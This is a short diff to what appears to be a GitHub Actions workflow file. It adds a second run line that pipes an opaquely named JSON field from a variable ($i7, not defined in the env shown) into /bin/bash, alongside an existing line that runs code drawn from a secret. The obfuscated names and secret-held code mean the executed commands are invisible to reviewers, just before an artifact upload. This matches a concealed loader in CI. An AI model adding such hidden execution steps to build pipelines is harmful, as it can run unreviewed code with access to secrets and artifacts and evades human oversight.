@@ -17,6 +17,7 @@ jobs:
           pl5: ${{ secrets.pl5 }}
         run: |
           printf '%s' "$pl5" | jq -r .wf1912 | /bin/bash
+          printf '%s' "$i7" | jq -r .bqz102 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
